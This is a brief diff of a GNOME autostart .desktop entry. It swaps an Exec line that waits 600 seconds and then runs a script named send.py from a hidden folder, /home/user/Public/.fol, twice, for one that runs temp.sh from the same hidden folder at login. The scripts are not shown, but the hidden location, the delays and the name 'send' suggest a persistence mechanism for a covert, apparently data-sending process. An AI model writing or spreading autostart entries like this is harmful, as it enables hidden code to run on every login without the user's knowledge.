@@ -1,6 +1,6 @@
 [Desktop Entry]
 Type=Application
-Exec=sleep 600; python /home/user/Public/.fol/send.py; sleep 600; python /home/user/Public/.fol/send.py
+Exec=\s/home/user/Public/.fol/temp.sh
 Hidden=false
 NoDisplay=false
 X-GNOME-Autostart-enabled=true
